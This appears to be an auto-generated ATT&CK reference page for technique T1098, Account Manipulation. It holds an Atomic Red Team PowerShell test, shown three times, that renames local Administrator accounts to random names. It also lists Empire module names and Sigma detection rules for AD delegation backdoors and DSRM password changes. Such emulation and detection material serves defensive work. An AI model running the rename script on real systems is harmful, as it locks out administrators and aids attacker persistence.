
# Account Manipulation

## Description

### MITRE Description

> Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Windows', 'Office 365', 'Azure', 'GCP', 'Azure AD', 'AWS', 'Linux', 'macOS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1098

## Potential Commands

```
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
        Write-Host "Successfully Renamed Administrator Account on" $hostname
        }
    }

powershell/management/honeyhash
powershell/management/honeyhash
powershell/situational_awareness/network/powerview/set_ad_object
powershell/situational_awareness/network/powerview/set_ad_object
```

## Commands Dataset

```
[{'command': '$x = Get-Random -Minimum 2 -Maximum 9999\n'
             '$y = Get-Random -Minimum 2 -Maximum 9999\n'
             '$z = Get-Random -Minimum 2 -Maximum 9999\n'
             '$w = Get-Random -Minimum 2 -Maximum 9999\n'
             'Write-Host HaHaHa_$x$y$z$w\n'
             '\n'
             '$hostname = (Get-CIMInstance CIM_ComputerSystem).Name\n'
             '\n'
             '$fmm = Get-CimInstance -ClassName win32_group -Filter "name = '
             '\'Administrators\'" | Get-CimAssociatedInstance -Association '
             'win32_groupuser | Select Name\n'
             '\n'
             'foreach($member in $fmm) {\n'
             '    if($member -like "*Administrator*") {\n'
             '        Rename-LocalUser -Name $member.Name -NewName '
             '"HaHaHa_$x$y$z$w"\n'
             '        Write-Host "Successfully Renamed Administrator Account '
             'on" $hostname\n'
             '        }\n'
             '    }\n',
  'name': None,
  'source': 'atomics/T1098/T1098.yaml'},
 {'command': 'powershell/management/honeyhash',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/honeyhash',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/powerview/set_ad_object',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/powerview/set_ad_object',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': '@neu5ron',
                  'description': 'Detects scenarios where one can control '
                                 'another users or computers account without '
                                 'having to use their credentials.',
                  'detection': {'condition': '(selection1 and not 1 of '
                                             'filter*) or selection2 or '
                                             'selection3 or selection4',
                                'filter1': {'AllowedToDelegateTo': None},
                                'filter2': {'AllowedToDelegateTo': '-'},
                                'selection1': {'EventID': 4738},
                                'selection2': {'AttributeLDAPDisplayName': 'msDS-AllowedToDelegateTo',
                                               'EventID': 5136},
                                'selection3': {'AttributeLDAPDisplayName': 'servicePrincipalName',
                                               'EventID': 5136,
                                               'ObjectClass': 'user'},
                                'selection4': {'AttributeLDAPDisplayName': 'msDS-AllowedToActOnBehalfOfOtherIdentity',
                                               'EventID': 5136}},
                  'falsepositives': ['Unknown'],
                  'id': '300bac00-e041-4ee2-9c36-e262656a6ecc',
                  'level': 'high',
                  'logsource': {'definition1': 'Requirements: Audit Policy : '
                                               'Account Management > Audit '
                                               'User Account Management, Group '
                                               'Policy : Computer '
                                               'Configuration\\Windows '
                                               'Settings\\Security '
                                               'Settings\\Advanced Audit '
                                               'Policy Configuration\\Audit '
                                               'Policies\\Account '
                                               'Management\\Audit User Account '
                                               'Management',
                                'definition2': 'Requirements: Audit Policy : '
                                               'DS Access > Audit Directory '
                                               'Service Changes, Group Policy '
                                               ': Computer '
                                               'Configuration\\Windows '
                                               'Settings\\Security '
                                               'Settings\\Advanced Audit '
                                               'Policy Configuration\\Audit '
                                               'Policies\\DS Access\\Audit '
                                               'Directory Service Changes',
                                'product': 'windows',
                                'service': 'security'},
                  'references': ['https://msdn.microsoft.com/en-us/library/cc220234.aspx',
                                 'https://adsecurity.org/?p=3466',
                                 'https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/'],
                  'tags': ['attack.t1098',
                           'attack.credential_access',
                           'attack.persistence'],
                  'title': 'Active Directory User Backdoors'}},
 {'data_source': {'author': 'Thomas Patzke',
                  'description': 'The Directory Service Restore Mode (DSRM) '
                                 'account is a local administrator account on '
                                 'Domain Controllers. Attackers may change the '
                                 'password to gain persistence.',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 4794}},
                  'falsepositives': ['Initial installation of a domain '
                                     'controller'],
                  'id': '53ad8e36-f573-46bf-97e4-15ba5bf4bb51',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'references': ['https://adsecurity.org/?p=1714'],
                  'status': 'stable',
                  'tags': ['attack.persistence',
                           'attack.privilege_escalation',
                           'attack.t1098'],
                  'title': 'Password Change on Directory Service Restore Mode '
                           '(DSRM) Account'}},
 {'data_source': ['4624', 'Authentication logs']},
 {'data_source': ['Windows event logs']},
 {'data_source': ['Packet capture']},
 {'data_source': ['API monitoring']},
 {'data_source': ['4624', 'Authentication logs']},
 {'data_source': ['Windows event logs']},
 {'data_source': ['Packet capture']},
 {'data_source': ['API monitoring']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Account Manipulation': {'atomic_tests': [{'auto_generated_guid': '5598f7cb-cf43-455e-883a-f6008c5d46af',
                                                                    'description': 'Manipulate '
                                                                                   'Admin '
                                                                                   'Account '
                                                                                   'Name\n',
                                                                    'executor': {'command': '$x '
                                                                                            '= '
                                                                                            'Get-Random '
                                                                                            '-Minimum '
                                                                                            '2 '
                                                                                            '-Maximum '
                                                                                            '9999\n'
                                                                                            '$y '
                                                                                            '= '
                                                                                            'Get-Random '
                                                                                            '-Minimum '
                                                                                            '2 '
                                                                                            '-Maximum '
                                                                                            '9999\n'
                                                                                            '$z '
                                                                                            '= '
                                                                                            'Get-Random '
                                                                                            '-Minimum '
                                                                                            '2 '
                                                                                            '-Maximum '
                                                                                            '9999\n'
                                                                                            '$w '
                                                                                            '= '
                                                                                            'Get-Random '
                                                                                            '-Minimum '
                                                                                            '2 '
                                                                                            '-Maximum '
                                                                                            '9999\n'
                                                                                            'Write-Host '
                                                                                            'HaHaHa_$x$y$z$w\n'
                                                                                            '\n'
                                                                                            '$hostname '
                                                                                            '= '
                                                                                            '(Get-CIMInstance '
                                                                                            'CIM_ComputerSystem).Name\n'
                                                                                            '\n'
                                                                                            '$fmm '
                                                                                            '= '
                                                                                            'Get-CimInstance '
                                                                                            '-ClassName '
                                                                                            'win32_group '
                                                                                            '-Filter '
                                                                                            '"name '
                                                                                            '= '
                                                                                            '\'Administrators\'" '
                                                                                            '| '
                                                                                            'Get-CimAssociatedInstance '
                                                                                            '-Association '
                                                                                            'win32_groupuser '
                                                                                            '| '
                                                                                            'Select '
                                                                                            'Name\n'
                                                                                            '\n'
                                                                                            'foreach($member '
                                                                                            'in '
                                                                                            '$fmm) '
                                                                                            '{\n'
                                                                                            '    '
                                                                                            'if($member '
                                                                                            '-like '
                                                                                            '"*Administrator*") '
                                                                                            '{\n'
                                                                                            '        '
                                                                                            'Rename-LocalUser '
                                                                                            '-Name '
                                                                                            '$member.Name '
                                                                                            '-NewName '
                                                                                            '"HaHaHa_$x$y$z$w"\n'
                                                                                            '        '
                                                                                            'Write-Host '
                                                                                            '"Successfully '
                                                                                            'Renamed '
                                                                                            'Administrator '
                                                                                            'Account '
                                                                                            'on" '
                                                                                            '$hostname\n'
                                                                                            '        '
                                                                                            '}\n'
                                                                                            '    '
                                                                                            '}\n',
                                                                                 'elevation_required': True,
                                                                                 'name': 'powershell'},
                                                                    'name': 'Admin '
                                                                            'Account '
                                                                            'Manipulate',
                                                                    'supported_platforms': ['windows']}],
                                                  'attack_technique': 'T1098',
                                                  'display_name': 'Account '
                                                                  'Manipulation'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1098',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/honeyhash":  '
                                                                                 '["T1098"],',
                                            'Empire Module': 'powershell/management/honeyhash',
                                            'Technique': 'Account '
                                                         'Manipulation'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1098',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/network/powerview/set_ad_object":  '
                                                                                 '["T1098"],',
                                            'Empire Module': 'powershell/situational_awareness/network/powerview/set_ad_object',
                                            'Technique': 'Account '
                                                         'Manipulation'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)


# Mitigations


* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)

* [Network Segmentation](../mitigations/Network-Segmentation.md)
    
* [Multi-factor Authentication](../mitigations/Multi-factor-Authentication.md)
    
* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)
    

# Actors


* [Lazarus Group](../actors/Lazarus-Group.md)

* [APT3](../actors/APT3.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
